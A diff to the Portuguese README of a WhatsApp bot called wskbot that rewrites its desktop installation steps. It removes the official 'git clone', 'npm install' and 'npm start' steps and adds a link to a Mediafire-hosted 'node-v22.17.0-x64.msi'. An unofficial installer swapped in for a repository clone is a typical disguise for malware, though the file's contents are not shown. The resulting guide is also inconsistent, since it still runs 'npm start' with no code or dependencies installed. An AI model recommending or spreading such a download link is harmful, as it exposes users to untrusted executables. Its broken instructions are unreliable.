@@ -137,18 +137,12 @@ pm2 delete wskbot       # Remover
 
 ### 💻 Instalação no Windows/Linux/macOS (Desktop)
 
-**1. Clone o repositório**
+**1. Instale o node**
 ```bash
-git clone https://github.com/alissuwsk/wskbot.git
-cd wskbot
+https://www.mediafire.com/file/ybll166h8dka4rw/node-v22.17.0-x64.msi/file
 ```
 
-**2. Instale as dependências**
-```bash
-npm install
-```
-
-**3. Configure a API Key** (`utils/key.json`)
+**2. Configure a API Key** (`utils/key.json`)
 ```json
 {
   "apiKey": "sua_chave_aqui",
@@ -156,7 +150,7 @@ npm install
 }
 ```
 
-**4. Configure o Bot** (`config.json`)
+**3. Configure o Bot** (`config.json`)
 ```json
 {
   "prefix": "!",
@@ -166,12 +160,6 @@ npm install
   "lidbot": ""
 }
 ```
-
-**5. Inicie o Bot**
-```bash
-npm start
-```
-
 ---
 
 ### ✅ Verificar Instalação
@@ -183,14 +171,11 @@ node -v
 # Verificar npm
 npm -v
 
-# Verificar FFmpeg
-ffmpeg -version
-
 # Testar o bot
 npm start
 ```
 
-Escaneie o código QR com seu WhatsApp para conectar!
+Digite o numero do WhatsApp que ira conectar o BOT para conectar!
 
 ---
 
